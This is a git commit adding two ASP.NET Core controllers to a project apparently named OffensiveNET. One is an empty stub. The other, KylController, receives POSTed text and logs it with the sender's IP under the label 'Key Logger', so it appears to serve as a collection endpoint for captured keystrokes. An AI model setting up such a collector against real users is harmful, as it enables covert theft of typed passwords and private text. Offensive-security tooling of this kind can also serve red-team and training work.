caf42bd3fe236f32997f5d16b8480651e39b462f
Jamie Bowman <mrjamiebowman@gmail.com>
2020-03-21 15:29:43 -0400

    complex initial code

---
+++ OffensiveNET/Complex/Controllers/DefaultController.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Mvc;
+
+namespace Complex.Controllers
+{
+    [Route("api/")]
+    [ApiController]
+    public class DefaultController : ControllerBase
+    {
+        // GET: api/Default
+        [HttpGet]
+        public string Get()
+        {
+            return "";
+        }
+
+        // GET: api/Default/5
+        [HttpGet("{id}", Name = "Get")]
+        public string Get(string id)
+        {
+            return "id";
+
+        }
+    }
+}
---
+++ OffensiveNET/Complex/Controllers/KylController.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+
+namespace Complex.Controllers
+{
+    [ApiController]
+    [Route("[controller]")]
+    public class KylController : BaseController
+    {
+        private readonly ILogger<KylController> _logger;
+        private IHttpContextAccessor _accessor;
+
+        public KylController(ILogger<KylController> logger, IHttpContextAccessor accessor)
+        {
+            _accessor = accessor;
+            _logger = logger;
+        }
+
+        [HttpPost]
+        public void Post([FromBody] string value)
+        {
+            string ip = _accessor.HttpContext.Connection.RemoteIpAddress.ToString();
+            Console.WriteLine($"Key Logger ({ip}): {value}");
+        }
+    }
+}
